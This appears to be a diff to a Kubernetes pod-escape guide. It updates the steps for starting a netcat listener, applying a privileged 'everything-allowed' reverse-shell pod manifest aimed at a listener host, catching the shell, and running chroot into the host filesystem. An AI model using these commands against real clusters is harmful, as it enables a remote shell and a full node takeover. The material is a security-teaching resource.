@@ -24,18 +24,17 @@ Set up listener
 nc -nvlp 3116
 ```
 
-Create the pod
+Create pod from local manifest without modifying it by using env variables and envsubst
 ```bash
-# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/everything-allowed-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
 ```
 
 Catch the shell and chroot to /host 
 ```bash
-~ nc -nvlp 3116
+$ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
-~ chroot /host
+# chroot /host
 ```
 
 # Post exploitation
